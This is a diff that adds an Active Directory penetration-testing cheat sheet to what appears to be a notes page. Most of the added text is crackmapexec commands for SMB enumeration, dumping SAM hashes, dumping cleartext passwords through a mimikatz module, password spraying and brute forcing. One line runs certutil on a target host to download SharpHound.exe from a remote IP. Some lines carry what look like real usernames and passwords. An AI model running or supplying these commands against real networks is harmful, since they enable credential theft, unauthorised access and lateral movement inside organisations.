@@ -83,4 +83,34 @@ An Internal Penetration Test differs from a vulnerability assessment in that it 
 Using it you can to control domain computers and services that are running on every node of your domain.
 
 Active Directory (Pen Test ) is most commonly used in the Enterprise Infrastructure to manage 1000’s of computers in the organization with a single point of control as “Domain Controller”
-Performing Penetration Testing of Active Directory is more interesting and are mainly targeted by many APT Groups with a lot of different techniques   
+Performing Penetration Testing of Active Directory is more interesting and are mainly targeted by many APT Groups with a lot of different techniques
+
+    Check SMB Service in use:
+    cat hosts.txt | xargs -I{} sh -c 'crackmapexec smb {}'
+    
+    Enumerate shares:
+    crackmapexec 192.168.0.12 -u username -p 'password'  --shares
+
+    Whos logged into the machine:
+    crackmapexec 192.168.0.12 -u username -p 'password' --users
+
+    Dump local sam hashes
+    python crackmapexec 192.168.0.12 -u username -p 'password' --sam
+
+    Dump clear text password:
+    crackmapexec 192.168.0.12 -u username -p 'password' -m modules/credentials/mimikatz.py
+
+    Downloading:
+    cme smb 10.128.111.203 -u 'xampp' -p '@sdF1234' -d HQCMSDBQ -x "certutil.exe -urlcache -split -f http://172.17.17.214/SharpHound.exe pentest/zz.exe"
+
+    Check account lockout policy:
+    crackmapexec smb 192.168.1.101 -u syedali -p 'reptile125ZZZ'  --pass-pol
+
+    Password spray:
+    python crackmapexec.py 192.168.0.0/24 -u username -p 'password'
+                
+    Bruteforce:
+    crackmapexec smb 192.168.1.102 -u username.txt -p gooo
+
+    Connecting:
+    smbclient -L 192.168.1.112 -U "Creative Green"
